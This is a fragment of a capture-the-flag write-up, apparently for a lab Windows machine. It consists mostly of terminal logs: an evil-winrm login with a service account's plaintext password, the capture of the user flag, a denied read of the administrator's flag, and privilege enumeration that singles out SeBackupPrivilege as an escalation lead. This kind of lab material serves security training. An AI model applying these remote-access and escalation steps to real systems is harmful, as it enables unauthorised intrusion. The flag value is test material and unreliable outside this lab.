
`evil-winrm -i 10.129.176.2 -u 'return\svc-printer' -p '1edFg43012!!'`

```sh
┌──(fixit42㉿kali)-[~]
└─$ evil-winrm -i 10.129.176.2 -u 'return\svc-printer' -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-printer> cd desktop
*Evil-WinRM* PS C:\Users\svc-printer\desktop> ls


    Directory: C:\Users\svc-printer\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/25/2025   2:22 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\desktop> type user.txt
79adfe23c849d5eb9901f0b2b5537c8c
```

```sh
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/27/2021   4:40 AM                Administrator
d-r---        5/26/2021   1:50 AM                Public
d-----        5/26/2021   1:51 AM                svc-printer

*Evil-WinRM* PS C:\Users> cd administrator
*Evil-WinRM* PS C:\Users\administrator> cd desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> ls


    Directory: C:\Users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/25/2025   2:22 PM             34 root.txt


*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
Access to the path 'C:\Users\administrator\desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\administrator\desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\administrator\desktop> 
```

```sh
*Evil-WinRM* PS C:\Users\administrator\desktop> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Mandatory Label\High Mandatory Level       Label            S-1-16-12288

SeBackupPrivilege             Back up files and directories       Enabled

